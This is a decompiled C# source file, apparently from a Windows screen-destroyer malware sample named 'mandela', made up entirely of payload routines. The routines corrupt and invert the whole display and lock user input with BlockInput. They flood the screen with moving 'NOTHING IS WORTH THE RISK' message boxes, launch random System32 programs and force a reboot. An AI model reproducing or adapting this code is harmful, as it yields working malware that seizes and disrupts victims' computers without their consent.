using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using CsharpGDI;

namespace mandela
{
	// Token: 0x02000007 RID: 7
	public class gdi : gdi32
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00004C9C File Offset: 0x00002E9C
		public void gdi_payload()
		{
			for (int i = 0; i < 100; i++)
			{
				this.int_0 = Screen.PrimaryScreen.Bounds.Width;
				this.int_1 = Screen.PrimaryScreen.Bounds.Height;
				this.random_0 = new Random();
				this.intptr_0 = gdi32.GetDC(gdi32.NULL);
				this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
				this.intptr_2 = gdi32.CreateCompatibleBitmap(this.intptr_0, this.int_0, this.int_1);
				gdi32.SelectObject(this.intptr_1, this.intptr_2);
				gdi32.BitBlt(this.intptr_1, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.BITMAPINFOHEADER bitmapinfoheader = default(gdi32.BITMAPINFOHEADER);
				gdi32.BITMAPINFO bitmapinfo = default(gdi32.BITMAPINFO);
				bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(bitmapinfoheader);
				bitmapinfo.bmiHeader.biWidth = this.int_0;
				bitmapinfo.bmiHeader.biHeight = -this.int_1;
				bitmapinfo.bmiHeader.biPlanes = 1;
				bitmapinfo.bmiHeader.biBitCount = 1;
				bitmapinfo.bmiHeader.biCompression = 0U;
				byte[] array = new byte[this.int_0 * this.int_1 * 4];
				gdi32.GetDIBits(this.intptr_1, this.intptr_2, 0U, (uint)this.int_1, array, ref bitmapinfo, gdi32.DIB_Color_Mode.DIB_RGB_COLORS);
				IntPtr dc = gdi32.GetDC(gdi32.NULL);
				IntPtr intPtr = gdi32.CreateBitmap(this.int_0, this.int_1, 1U, 1U, array);
				gdi32.SelectObject(this.intptr_1, intPtr);
				gdi32.BitBlt(dc, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.DeleteObject(intPtr);
				gdi32.DeleteObject(this.intptr_2);
				gdi32.DeleteDC(this.intptr_1);
				gdi32.ReleaseDC(IntPtr.Zero, this.intptr_0);
				gdi32.ReleaseDC(gdi32.GetDesktopWindow(), dc);
				if (this.random_0.Next(20) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.NOTSRCCOPY);
					gdi32.DeleteDC(this.intptr_0);
				}
				if (this.random_0.Next(10) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.BitBlt(this.intptr_0, this.random_0.Next(-100, 100), this.random_0.Next(-100, 100), this.random_0.Next(-300, this.int_0), this.random_0.Next(-300, this.int_1), this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
					gdi32.DeleteDC(this.intptr_0);
				}
				else if (this.random_0.Next(10) == 0)
				{
					gdi32.InvalidateRect(gdi32.NULL, gdi32.NULL, true);
				}
				if (this.random_0.Next(20) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.StretchBlt(this.intptr_0, 1, 1, this.int_0, this.int_1, this.intptr_0, 0, 0, this.int_0, this.int_1, gdi32.TernaryRasterOperations.SRCAND);
					gdi32.DeleteDC(this.intptr_0);
				}
				Thread.Sleep(200);
			}
			gdi32.BlockInput(true);
			Beats beats = new Beats();
			beats.stop_beat();
			this.random_0 = new Random();
			gdi.isscary = true;
			gdi32.InvalidateRect(gdi32.NULL, gdi32.NULL, true);
			Thread.Sleep(3000);
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.BLACKNESS);
			gdi32.DeleteDC(this.intptr_0);
			Thread.Sleep(this.random_0.Next(5000, 10000));
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
			this.intptr_2 = gdi32.LoadImage(gdi32.NULL, WarnWin.res_path + WarnWin.images[this.random_0.Next(WarnWin.images.Length)], 0U, this.int_0, this.int_1, 8208U);
			gdi32.SelectObject(this.intptr_1, this.intptr_2);
			gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
			gdi32.DeleteObject(this.intptr_1);
			gdi32.DeleteObject(this.intptr_2);
			gdi32.DeleteDC(this.intptr_0);
			beats.beat(1, 30, 2, 0);
			Thread.Sleep(this.random_0.Next(5000, 10000));
			beats.stop_beat();
			Thread.Sleep(2000);
			gdi32.BlockInput(false);
			gdi32.InvalidateRect(gdi32.NULL, gdi32.NULL, true);
			for (int j = 0; j < 100; j++)
			{
				this.int_0 = Screen.PrimaryScreen.Bounds.Width;
				this.int_1 = Screen.PrimaryScreen.Bounds.Height;
				Thread thread = new Thread(new ThreadStart(this.nothing));
				thread.Start();
				Thread.Sleep(50);
				thread.Abort();
				this.intptr_4 = gdi32.FindWindow(null, "NOTHING IS WORTH THE RISK");
				while (this.intptr_4 != gdi32.NULL)
				{
					gdi32.RECT rect;
					gdi32.GetWindowRect(this.intptr_4, out rect);
					gdi32.SetWindowPos(this.intptr_4, gdi32.NULL, this.random_0.Next(this.int_0), this.random_0.Next(this.int_1), rect.Right - rect.Left, rect.Bottom - rect.Top, 1U);
					this.intptr_4 = gdi32.FindWindowEx(gdi32.NULL, this.intptr_4, null, "NOTHING IS WORTH THE RISK");
				}
			}
			gdi32.BlockInput(true);
			new Thread(new ThreadStart(this.gdi_payload2)).Start();
			beats.beat(2, 31, 2, 200);
			Thread.Sleep(10000);
			Instant_Shutdown.Force_reboot();
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00005318 File Offset: 0x00003518
		public void gdi_payload2()
		{
			for (;;)
			{
				this.int_0 = Screen.PrimaryScreen.Bounds.Width;
				this.int_1 = Screen.PrimaryScreen.Bounds.Height;
				this.random_0 = new Random();
				this.random_0.Next(this.int_0);
				this.random_0.Next(this.int_1);
				this.intptr_0 = gdi32.GetDC(gdi32.NULL);
				this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
				this.intptr_2 = gdi32.CreateCompatibleBitmap(this.intptr_0, this.int_0, this.int_1);
				gdi32.SelectObject(this.intptr_1, this.intptr_2);
				gdi32.BitBlt(this.intptr_1, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.BITMAPINFOHEADER bitmapinfoheader = default(gdi32.BITMAPINFOHEADER);
				gdi32.BITMAPINFO bitmapinfo = default(gdi32.BITMAPINFO);
				bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(bitmapinfoheader);
				bitmapinfo.bmiHeader.biWidth = this.int_0;
				bitmapinfo.bmiHeader.biHeight = -this.int_1;
				bitmapinfo.bmiHeader.biPlanes = 1;
				bitmapinfo.bmiHeader.biBitCount = 32;
				bitmapinfo.bmiHeader.biCompression = 0U;
				int num = this.int_0 * this.int_1 * 4;
				byte[] array = new byte[num];
				gdi32.GetDIBits(this.intptr_1, this.intptr_2, 0U, (uint)this.int_1, array, ref bitmapinfo, gdi32.DIB_Color_Mode.DIB_RGB_COLORS);
				for (int i = 0; i < num; i += 4)
				{
					byte[] array2 = array;
					int num2 = i + 1;
					byte[] array3 = array;
					int num3 = i + 2;
					byte[] array4 = array;
					int num4 = i;
					array2[num2] = (array3[num3] = (array4[num4] += 50));
				}
				IntPtr dc = gdi32.GetDC(gdi32.NULL);
				IntPtr intPtr = gdi32.CreateBitmap(this.int_0, this.int_1, 1U, 32U, array);
				gdi32.SelectObject(this.intptr_1, intPtr);
				gdi32.BitBlt(dc, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.DeleteObject(intPtr);
				gdi32.DeleteObject(this.intptr_2);
				gdi32.DeleteDC(this.intptr_1);
				gdi32.DeleteDC(this.intptr_0);
				Thread.Sleep(10);
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00005570 File Offset: 0x00003770
		public void gdi_payload3()
		{
			this.int_0 = Screen.PrimaryScreen.Bounds.Width;
			this.int_1 = Screen.PrimaryScreen.Bounds.Height;
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
			this.intptr_2 = gdi32.LoadImage(gdi32.NULL, WarnWin.res_path + WarnWin.images2[0], 0U, this.int_0, this.int_1, 8208U);
			gdi32.SelectObject(this.intptr_1, this.intptr_2);
			gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
			gdi32.DeleteObject(this.intptr_1);
			gdi32.DeleteObject(this.intptr_2);
			gdi32.DeleteDC(this.intptr_0);
			Thread.Sleep(5000);
			gdi32.InvalidateRect(gdi32.NULL, gdi32.NULL, true);
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			IntPtr intPtr = gdi32.CreateSolidBrush(ColorTranslator.ToWin32(Color.Blue));
			gdi32.SelectObject(this.intptr_0, intPtr);
			gdi32.PatBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, gdi32.TernaryRasterOperations.PATCOPY);
			gdi32.DeleteObject(intPtr);
			gdi32.DeleteDC(this.intptr_0);
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			IntPtr intPtr2 = gdi32.CreateFont(this.int_0 / 30, 0, 0, 0, 400, 0U, 0U, 0U, 0U, 0U, 0U, 0U, 0U, "Arial");
			this.intptr_3 = gdi32.SelectObject(this.intptr_0, intPtr2);
			string text = "NOTHING IS WORTH THE RISK";
			gdi32.SetTextColor(this.intptr_0, ColorTranslator.ToWin32(Color.White));
			gdi32.SetBkColor(this.intptr_0, ColorTranslator.ToWin32(Color.Blue));
			gdi32.TextOut(this.intptr_0, 0, 0, text, text.Length);
			gdi32.SelectObject(this.intptr_0, this.intptr_3);
			gdi32.DeleteObject(intPtr2);
			Thread.Sleep(5000);
			new Beats().beat(3, 30, 2, 0);
			this.intptr_0 = gdi32.GetDC(gdi32.NULL);
			this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
			this.intptr_2 = gdi32.LoadImage(gdi32.NULL, WarnWin.res_path + WarnWin.images2[1], 0U, this.int_0, this.int_1, 8208U);
			gdi32.SelectObject(this.intptr_1, this.intptr_2);
			gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
			gdi32.DeleteObject(this.intptr_1);
			gdi32.DeleteObject(this.intptr_2);
			gdi32.DeleteDC(this.intptr_0);
			Thread.Sleep(5000);
			Instant_Shutdown.Force_reboot();
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00005864 File Offset: 0x00003A64
		public void gdi_payload4()
		{
			while (!Payload_Timer.rapid)
			{
				this.int_0 = Screen.PrimaryScreen.Bounds.Width;
				this.int_1 = Screen.PrimaryScreen.Bounds.Height;
				this.intptr_0 = gdi32.GetDC(gdi32.NULL);
				this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
				this.intptr_2 = gdi32.CreateCompatibleBitmap(this.intptr_0, this.int_0, this.int_1);
				gdi32.SelectObject(this.intptr_1, this.intptr_2);
				gdi32.BitBlt(this.intptr_1, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.BITMAPINFOHEADER bitmapinfoheader = default(gdi32.BITMAPINFOHEADER);
				gdi32.BITMAPINFO bitmapinfo = default(gdi32.BITMAPINFO);
				bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(bitmapinfoheader);
				bitmapinfo.bmiHeader.biWidth = this.int_0;
				bitmapinfo.bmiHeader.biHeight = -this.int_1;
				bitmapinfo.bmiHeader.biPlanes = 1;
				bitmapinfo.bmiHeader.biBitCount = 32;
				bitmapinfo.bmiHeader.biCompression = 0U;
				int num = this.int_0 * this.int_1 * 4;
				byte[] array = new byte[num];
				gdi32.GetDIBits(this.intptr_1, this.intptr_2, 0U, (uint)this.int_1, array, ref bitmapinfo, gdi32.DIB_Color_Mode.DIB_RGB_COLORS);
				for (int i = 0; i < num; i += 4)
				{
					array[i + 1] = (array[i + 2] = array[i]);
				}
				IntPtr dc = gdi32.GetDC(gdi32.NULL);
				IntPtr intPtr = gdi32.CreateBitmap(this.int_0, this.int_1, 1U, 32U, array);
				gdi32.SelectObject(this.intptr_1, intPtr);
				gdi32.BitBlt(dc, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.DeleteObject(intPtr);
				gdi32.DeleteObject(this.intptr_2);
				gdi32.DeleteDC(this.intptr_1);
				gdi32.DeleteDC(this.intptr_0);
				Thread.Sleep(300);
			}
			while (Payload_Timer.rapid)
			{
				this.int_0 = Screen.PrimaryScreen.Bounds.Width;
				this.int_1 = Screen.PrimaryScreen.Bounds.Height;
				this.random_0 = new Random();
				this.intptr_0 = gdi32.GetDC(gdi32.NULL);
				this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
				this.intptr_2 = gdi32.CreateCompatibleBitmap(this.intptr_0, this.int_0, this.int_1);
				gdi32.SelectObject(this.intptr_1, this.intptr_2);
				gdi32.BitBlt(this.intptr_1, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.BITMAPINFOHEADER bitmapinfoheader2 = default(gdi32.BITMAPINFOHEADER);
				gdi32.BITMAPINFO bitmapinfo2 = default(gdi32.BITMAPINFO);
				bitmapinfo2.bmiHeader.biSize = (uint)Marshal.SizeOf(bitmapinfoheader2);
				bitmapinfo2.bmiHeader.biWidth = this.int_0;
				bitmapinfo2.bmiHeader.biHeight = -this.int_1;
				bitmapinfo2.bmiHeader.biPlanes = 1;
				bitmapinfo2.bmiHeader.biBitCount = 1;
				bitmapinfo2.bmiHeader.biCompression = 0U;
				byte[] array2 = new byte[this.int_0 * this.int_1 * 4];
				gdi32.GetDIBits(this.intptr_1, this.intptr_2, 0U, (uint)this.int_1, array2, ref bitmapinfo2, gdi32.DIB_Color_Mode.DIB_RGB_COLORS);
				IntPtr dc2 = gdi32.GetDC(gdi32.NULL);
				IntPtr intPtr2 = gdi32.CreateBitmap(this.int_0, this.int_1, 1U, 1U, array2);
				gdi32.SelectObject(this.intptr_1, intPtr2);
				gdi32.BitBlt(dc2, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
				gdi32.DeleteObject(intPtr2);
				gdi32.DeleteObject(this.intptr_2);
				gdi32.DeleteDC(this.intptr_1);
				gdi32.DeleteDC(this.intptr_0);
				if (this.random_0.Next(20) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					this.intptr_1 = gdi32.CreateCompatibleDC(this.intptr_0);
					this.intptr_2 = gdi32.LoadImage(gdi32.NULL, WarnWin.res_path + WarnWin.images[this.random_0.Next(WarnWin.images.Length)], 0U, this.int_0, this.int_1, 8208U);
					gdi32.SelectObject(this.intptr_1, this.intptr_2);
					gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_1, 0, 0, (this.random_0.Next(2) == 1) ? gdi32.TernaryRasterOperations.SRCCOPY : gdi32.TernaryRasterOperations.NOTSRCCOPY);
					gdi32.DeleteObject(this.intptr_1);
					gdi32.DeleteObject(this.intptr_2);
					gdi32.DeleteDC(this.intptr_0);
				}
				if (this.random_0.Next(20) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.BitBlt(this.intptr_0, 0, 0, this.int_0, this.int_1, this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.NOTSRCCOPY);
					gdi32.DeleteDC(this.intptr_0);
				}
				if (this.random_0.Next(10) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.BitBlt(this.intptr_0, this.random_0.Next(-100, 100), this.random_0.Next(-100, 100), this.random_0.Next(-300, this.int_0), this.random_0.Next(-300, this.int_1), this.intptr_0, 0, 0, gdi32.TernaryRasterOperations.SRCCOPY);
					gdi32.DeleteDC(this.intptr_0);
				}
				else if (this.random_0.Next(10) == 0)
				{
					gdi32.InvalidateRect(gdi32.NULL, gdi32.NULL, true);
				}
				if (this.random_0.Next(20) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					gdi32.StretchBlt(this.intptr_0, 1, 1, this.int_0, this.int_1, this.intptr_0, 0, 0, this.int_0, this.int_1, gdi32.TernaryRasterOperations.SRCAND);
					gdi32.DeleteDC(this.intptr_0);
				}
				if (this.random_0.Next(10) == 1)
				{
					this.intptr_0 = gdi32.GetDC(gdi32.NULL);
					IntPtr intPtr3 = gdi32.CreateFont(this.random_0.Next(this.int_0 / 50, this.int_0 / 10), 0, 0, 0, 700, 0U, 0U, 0U, 0U, 0U, 0U, 0U, 0U, "Arial");
					this.intptr_3 = gdi32.SelectObject(this.intptr_0, intPtr3);
					string text = "NOTHING IS WORTH THE RISK";
					gdi32.SetTextColor(this.intptr_0, ColorTranslator.ToWin32(Color.Black));
					gdi32.SetBkColor(this.intptr_0, ColorTranslator.ToWin32(Color.White));
					gdi32.TextOut(this.intptr_0, this.random_0.Next(this.int_0), this.random_0.Next(this.int_1), text, text.Length);
					gdi32.SelectObject(this.intptr_0, this.intptr_3);
					gdi32.DeleteObject(intPtr3);
					gdi32.DeleteDC(this.intptr_0);
				}
				if (this.random_0.Next(50) == 1)
				{
					try
					{
						string[] files = Directory.GetFiles("C:\\Windows\\System32", "*.exe");
						Process.Start(files[this.random_0.Next(files.Length)]);
					}
					catch
					{
					}
				}
				Thread.Sleep(5);
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00006014 File Offset: 0x00004214
		public void nothing()
		{
			MessageBox.Show("NOTHING IS WORTH THE RISK", "NOTHING IS WORTH THE RISK", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x04000022 RID: 34
		private Random random_0;

		// Token: 0x04000023 RID: 35
		private IntPtr intptr_0;

		// Token: 0x04000024 RID: 36
		private IntPtr intptr_1;

		// Token: 0x04000025 RID: 37
		private IntPtr intptr_2;

		// Token: 0x04000026 RID: 38
		private IntPtr intptr_3;

		// Token: 0x04000027 RID: 39
		private IntPtr intptr_4;

		// Token: 0x04000028 RID: 40
		public static bool isscary;

		// Token: 0x04000029 RID: 41
		private int int_0;

		// Token: 0x0400002A RID: 42
		private int int_1;
	}
}
